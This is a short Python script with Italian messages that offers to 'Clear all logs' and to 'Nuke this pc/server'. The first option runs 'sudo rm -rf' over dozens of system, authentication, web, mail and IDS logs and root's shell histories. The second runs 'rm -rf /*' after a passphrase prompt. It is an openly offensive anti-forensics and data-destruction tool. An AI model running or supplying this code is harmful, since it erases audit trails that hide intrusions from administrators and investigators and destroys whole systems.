import os, sys

def clean():

        #array of logs dir
        logs = ["var/log/lastlog",
            "/var/log/messages",
            "/var/log/warn",
            "/var/log/wtmp",
            "/var/log/poplog",
            "/var/log/qmail",
            "/var/log/smtpd",
            "/var/log/telnetd",
            "/var/log/secure",
            "/var/log/auth",
            "/var/log/auth.log",
            "/var/log/cups/access_log",
            "/var/log/cups/error_log",
            "/var/log/thttpd_log",
            "/var/log/spooler",
            "/var/spool/tmp",
            "/var/spool/errors",
            "/var/spool/locks",
            "/var/log/nctfpd.errs",
            "/var/log/acct",
            "/var/apache/log",
            "/var/apache/logs",
            "/usr/local/apache/log",
            "/usr/local/apache/logs",
            "/usr/local/www/logs/thttpd_log",
            "/var/log/news",
            "/var/log/news/news",
            "/var/log/news.all",
            "/var/log/news/news.all",
            "/var/log/news/news.crit",
            "/var/log/news/news.err",
            "/var/log/news/news.notice",
            "/var/log/news/suck.err",
            "/var/log/news/suck.notice",
            "/var/log/xferlog",
            "/var/log/proftpd/xferlog.legacy",
            "/var/log/proftpd.xferlog",
            "/var/log/proftpd.access_log",
            "/var/log/httpd/error_log",
            "/var/log/httpsd/ssl_log",
            "/var/log/httpsd/ssl.access_log",
            "/var/adm",
            "/var/run/utmp",
            "/etc/wtmp",
            "/etc/utmp",
            "/etc/mail/access",
            "/var/log/mail/info.log",
            "/var/log/mail/errors.log",
            "/var/log/httpd/*_log",
            "/var/log/ncftpd/misclog.txt",
            "/var/account/pacct",
            "/var/log/snort",
            "/var/log/bandwidth",
            "/var/log/explanations",
            "/var/log/syslog",
            "/var/log/user.log",
            "/var/log/daemons/info.log",
            "/var/log/daemons/warnings.log",
            "/var/log/daemons/errors.log",
            "/etc/httpd/logs/error_log",
            "/etc/httpd/logs/log",
            "/var/log/mysqld/mysqld.log"
            "/root/.ksh_history",
            "/root/.bash_history",
            "/root/.sh_history",
            "/root/.history",
            "/root/*_history",
            "/root/.login",
            "/root/.logout",
            "/root/.bash_logut",
            "./root/.Xauthority"]

        #removing file
        for file in logs:
            '''if(os.path.exists(file)):
                find += 1
                #open(file, 'w').close()
                os.system('rm -rf' + file)
            else:
                print(file + ' non trovato')
                notFind += 1'''
            try:
                os.system('sudo ' + 'rm ' + '-rf ' + file)
            except ValueError:
                print('file non trovato')


        print('Pulizia eseguita broo!')
def intro():
    loop = True
    while loop:
        menu()
        choice = input( "Enter your choice [1-3]: " )

        if  choice == '1':
            clean()
            loop = False
        elif choice == '2':
            nuke()
            loop = False
        elif choice == '3':
            loop = False
            print('ciao fraah, alla prossima')
        else:
            input( "Wrong option selection. Enter any key to try again.." )
def menu():
    print (30 * "-" , "MENU" , 30 * "-")
    print ("1. Clear all logs")
    print ("2. Nuke this pc/server")
    print ("3. Exit")
    print (67 * "-")
def nuke():
    choice = input('Sei sicuro di volerlo fare?? Scrivi yes se ne sei sicuro ')
    if(choice == 'yes'):
        print('Scrivi ora questa parola, dopo averlo fatto il disco verrà cancellato.')
        choiceSec = input('La parola è: cheSchifoLaPostale')
        if(choiceSec == 'cheSchifoLaPostale'):
            print('addio fraahhh')
            os.system('rm ' + '-rf ' + '/*')
    elif(choice == 'no'):
        print('ok, sei una persona saggia')
intro()